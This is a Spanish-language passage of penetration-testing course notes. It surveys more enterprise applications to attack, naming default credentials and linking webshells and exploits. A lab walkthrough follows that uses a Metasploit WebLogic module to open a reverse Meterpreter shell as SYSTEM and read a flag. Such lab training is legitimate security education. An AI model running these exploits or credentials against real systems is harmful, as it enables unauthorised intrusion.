
# Otras aplicaciones notables

Aunque este módulo se centra en nueve aplicaciones específicas, todavía hay muchas otras diferentes que podemos encontrar en la práctica. He realizado pruebas de penetración de gran envergadura y terminé con un informe EyeWitness de más de 500 páginas para analizar.

El módulo fue diseñado para enseñar una metodología que se pueda aplicar a todas las demás aplicaciones que podamos encontrar. La lista de aplicaciones que cubrimos en este módulo cubre las funciones principales y la mayoría de los objetivos de la gran cantidad de aplicaciones individuales para aumentar la eficacia de sus evaluaciones internas y externas durante sus pruebas de penetración.

Abordamos la enumeración de la red y la creación de una representación visual de las aplicaciones dentro de una red para garantizar la máxima cobertura. También abordamos una variedad de formas en las que podemos atacar aplicaciones comunes, desde la identificación y el descubrimiento hasta el abuso de la funcionalidad incorporada y los exploits públicos conocidos. El objetivo de las secciones sobre osTicket y GitLab no era solo enseñarle cómo enumerar y atacar estas aplicaciones específicas, sino también mostrar cómo los sistemas de tickets de soporte técnico y las aplicaciones de repositorio Git pueden dar frutos que pueden ser útiles en otras partes durante una interacción.

Una gran parte de las pruebas de penetración consiste en adaptarse a lo desconocido. Algunos evaluadores pueden ejecutar algunos análisis y desanimarse cuando no ven nada que se pueda explotar directamente. Si podemos analizar nuestros datos de análisis y filtrar todo el ruido, a menudo encontraremos cosas que los escáneres pasan por alto, como una instancia de Tomcat con credenciales débiles o predeterminadas o un repositorio Git abierto que nos brinda una clave SSH o una contraseña que podemos usar en otro lugar para obtener acceso.&#x20;

Tener un conocimiento profundo de la metodología y la mentalidad necesarias lo hará exitoso, sin importar si la red de destino tiene WordPress y Tomcat o un sistema de tickets de soporte personalizado y un sistema de monitoreo de red como Nagios. Asegúrese de comprender las diversas técnicas que se enseñan para rastrear estas aplicaciones y la curiosidad de explorar una aplicación desconocida. Encontrará aplicaciones que no se enumeran en este módulo. De manera similar a lo que hice con la aplicación Nexus Repository OSS en la sección de introducción, puede aplicar estos principios para encontrar problemas como credenciales predeterminadas y funcionalidad incorporada que conducen a la ejecución remota de código.

***

## <mark style="color:purple;">Menciones honoríficas</mark>

Dicho esto, aquí hay algunas otras aplicaciones que hemos encontrado durante las evaluaciones y que vale la pena tener en cuenta:

<table data-header-hidden><thead><tr><th width="167"></th><th></th></tr></thead><tbody><tr><td>Solicitud</td><td>Información sobre abuso</td></tr><tr><td><a href="https://axis.apache.org/axis2/java/core/">Axis2</a></td><td>Se puede abusar de esto de forma similar a Tomcat. A menudo lo veremos instalado sobre una instalación de Tomcat. Si no podemos obtener RCE a través de Tomcat, vale la pena verificar si hay credenciales de administrador débiles o predeterminadas en Axis2. Luego podemos cargar un <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">webshell</a> en forma de archivo AAR (archivo de servicio de Axis2). También hay un <a href="https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html">módulo</a> Metasploit que puede ayudar con esto.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server">Websphere</a></td><td>Websphere ha sufrido muchas <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html">vulnerabilidades</a> diferentes a lo largo de los años. Además, si podemos iniciar sesión en la consola administrativa con credenciales predeterminadas, como por ejemplo, <code>system:manager</code>podemos implementar un archivo WAR (similar a Tomcat) y obtener RCE a través de un shell web o un shell inverso.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Elasticsearch">Elasticsearch</a></td><td>Elasticsearch también ha tenido su cuota de vulnerabilidades. Aunque es antiguo, ya <a href="https://www.exploit-db.com/exploits/36337">lo</a> hemos visto antes en instalaciones olvidadas de Elasticsearch durante una evaluación para una gran empresa (y lo hemos identificado en cientos de páginas del resultado del informe de EyeWitness). Aunque no es realista, la máquina Hack The Box <a href="https://youtube.com/watch?v=oGO9MEIz_tI&#x26;t=54">Haystack</a> cuenta con Elasticsearch.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Zabbix">Zabbix</a></td><td>Zabbix es una solución de monitoreo de red y sistema de código abierto en la que se han descubierto bastantes <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html">vulnerabilidades</a> , como inyección SQL, omisión de autenticación, XSS Stored, divulgación de contraseñas LDAP y ejecución remota de código. Zabbix también tiene una funcionalidad incorporada que se puede utilizar de forma abusiva para obtener ejecución remota de código. El cuadro HTB <a href="https://youtube.com/watch?v=RLvFwiDK_F8&#x26;t=250">Zipper</a> muestra cómo usar la API de Zabbix para obtener RCE.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Nagios">Nagios</a></td><td>Nagios es otro producto de monitoreo de sistemas y redes. Nagios ha tenido una amplia variedad de problemas a lo largo de los años, incluyendo ejecución de código remoto, escalada de privilegios de root, inyección de SQL, inyección de código y XSS almacenado. Si encuentra una instancia de Nagios, vale la pena verificar las credenciales predeterminadas <code>nagiosadmin:PASSW0RD</code>y tomar la versión.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Oracle_WebLogic_Server">WebLogic</a></td><td>WebLogic es un servidor de aplicaciones Java EE. Al momento de escribir este artículo, tiene 190 <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-14534/Oracle-Weblogic-Server.html">CVE</a> reportados . Hay muchos exploits RCE no autenticados desde 2007 hasta 2021, muchos de los cuales son vulnerabilidades de deserialización de Java.</td></tr><tr><td>Wikis/Intranets</td><td>Podemos encontrarnos con Wikis internas (como MediaWiki), páginas de intranet personalizadas, SharePoint, etc. Vale la pena evaluarlas para detectar vulnerabilidades conocidas, pero también buscar si existe un repositorio de documentos. Nos hemos encontrado con muchas páginas de intranet (tanto personalizadas como de SharePoint) que tenían una función de búsqueda que permitió descubrir credenciales válidas.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/DNN_(software)">DotNetNuke</a></td><td>DotNetNuke (DNN) es un CMS de código abierto escrito en C# que utiliza el marco .NET. Ha tenido algunos <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-2486/product_id-4306/Dotnetnuke-Dotnetnuke.html">problemas</a> graves a lo largo del tiempo, como omisión de autenticación, navegación de directorios, XSS almacenado, omisión de carga de archivos y descarga de archivos arbitrarios.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/VCenter">vCenter</a></td><td>vCenter suele estar presente en grandes organizaciones para administrar varias instancias de ESXi. Vale la pena comprobar si hay credenciales débiles y vulnerabilidades como esta <a href="https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html">de Apache Struts 2 RCE</a> que los escáneres como Nessus no detectan. Esta vulnerabilidad <a href="https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/">de carga de archivos OVA no autenticados</a> se reveló a principios de 2021 y se publicó una prueba de concepto para <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005">CVE-2021-22005</a> durante el desarrollo de este módulo. vCenter se presenta como un dispositivo para Windows y Linux. Si obtenemos un shell en el dispositivo de Windows, la escalada de privilegios es relativamente sencilla utilizando JuicyPotato o similar. También hemos visto que vCenter ya se ejecuta como SYSTEM e incluso como administrador de dominio. Puede ser un gran punto de apoyo en el entorno o ser una única fuente de vulnerabilidad.</td></tr></tbody></table>

Una vez más, esta no es una lista exhaustiva, sino más ejemplos de las muchas cosas que podemos encontrar en una red corporativa. Como se muestra aquí, a menudo, una contraseña predeterminada y una funcionalidad integrada son todo lo que necesitamos.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.201.102
```

### Pregunta 1

> Enumera el host de destino e identifica la aplicación que se está ejecutando. ¿Qué aplicación se está ejecutando?

#### Escaneo de puertos

```bash
sudo nmap -v -sV -T5 10.129.201.102

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7001/tcp open  http          Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Es una máquina Windows, y nos interesa el puerto 7001, en el que está corriendo un Oracle Weblogic.

<figure><img src="/files/IDwXtTI3k3BPjHeNWp8D" alt=""><figcaption></figcaption></figure>

Al acceder nos da un 404. Por el puerto 80 no tenemos nada relevante.

### Pregunta 2

> Enumera la aplicación en busca de vulnerabilidades. Obtén ejecución remota de código y envía el contenido del archivo flag.txt del escritorio del administrador.

#### Exploit

Vamos a usar un módulo de Metasploit para explotar Weblogic:

```bash
msf6 exploit(multi/http/weblogic_admin_handle_rce) > setg rhosts 10.129.201.102
rhosts => 10.129.201.102
msf6 exploit(multi/http/weblogic_admin_handle_rce) > setg lhost tun0
lhost => tun0
msf6 exploit(multi/http/weblogic_admin_handle_rce) > run

[*] Started HTTPS reverse handler on https://10.10.15.109:8443
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Path traversal successful.
[*] Executing PowerShell Stager for windows/x64/meterpreter/reverse_https
[-] Failed to load client portion of stdapi.
[-] Failed to load client portion of priv.
[*] Meterpreter session 1 opened (10.10.15.109:8443 -> 10.129.201.102:49807) at 2025-02-12 17:55:23 +0000

meterpreter > 
```

Obtenemos usa sesión de Meterpreter como `SYSTEM`!

```bash
meterpreter > getuid
[-] The "getuid" command requires the "stdapi" extension to be loaded (run: `load stdapi`)
meterpreter > load stdapi
Loading extension stdapi...Success.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Accedemos al escritorio del administrador y encontramos la flag:

```bash
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  503   fil   2021-09-29 21:02:17 +0000  WebLogic_Admin_WinSvc_Install.cmd
100666/rw-rw-rw-  282   fil   2020-07-25 02:15:53 +0000  desktop.ini
100666/rw-rw-rw-  14    fil   2021-09-29 21:48:33 +0000  flag.txt

meterpreter > cat flag.txt 
w3b_****************
```
